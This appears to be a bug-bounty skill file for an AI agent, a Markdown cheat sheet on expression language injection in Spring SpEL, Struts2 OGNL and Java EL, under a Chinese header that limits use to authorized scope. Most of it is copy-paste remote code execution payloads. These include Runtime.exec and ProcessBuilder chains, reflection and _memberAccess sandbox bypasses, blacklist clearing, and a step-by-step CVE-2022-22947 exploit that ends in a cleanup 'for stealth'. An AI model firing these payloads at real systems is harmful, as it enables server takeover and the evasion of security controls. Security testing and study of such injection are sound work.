---
name: "el-injection-test"
description: "expression-language-injection"
---

> **ravenholt 环境版**：本文件由 `scripts/vendor_src_hunt.py` 按 `profiles/ravenholt.yaml` 生成。
> 技能一律用 `load_skill("src_hunt/<name>")` 按名加载，正文里的旧文件路径只作索引；
> `01`～`10` 指 `src_hunt/0X-*`。旧环境路径/工具名已替换；正文点名的脚本在沙箱里不存在时，改用等价工具，不要停工。

# expression-language-injection

> **使用边界**（2026-09-19 补治理头）：**仅限授权环境**（SRC 范围 / 用户自有资产 / 用户明确点名）。
> 写不写只认 `03-vuln-report-format.md`（**定级也认 03**：只到「可达 + 可绕 + 原语在工作」的**不得**写严重）。
>
> 本文件含**可直接复制**的命令执行载荷（`Runtime.exec` / `ProcessBuilder` / OGNL 全链）。用法分三档（同 `SKILL.md §2` 第 9 条）：
> · **检测 / 指纹**（`${7*7}` 一类）—— 任何环境，随便试。
> · **只读最小命令证明**（`id` / `whoami`）—— **授权范围内全部环境可做，含生产**；纪律：单发、只读、不落文件、不覆盖、不删改、不联网、不批量；**先跑无害标记确认点真被执行，再上 `id`**。
> · **仅解析 / 无载荷回连**（DNS 型 OOB，如 `dnslog` 域名；或**空响应 Listener** —— 只记录连接）—— **可做**（授权范围内，含生产），纪律见 `SKILL.md §2` 第 9 条。
> · **完整链 / 写文件 / 起常驻进程 / 第二段载荷 / 让目标加载远程类（LDAP/RMI 下发 reference、返回可反序列化对象）/ 需先绕一道安全机制（黑名单、RASP 等）** —— **不做**；要这一类证据，去非生产实例或本地靶场。

# Expression Language Injection


## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 6. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```
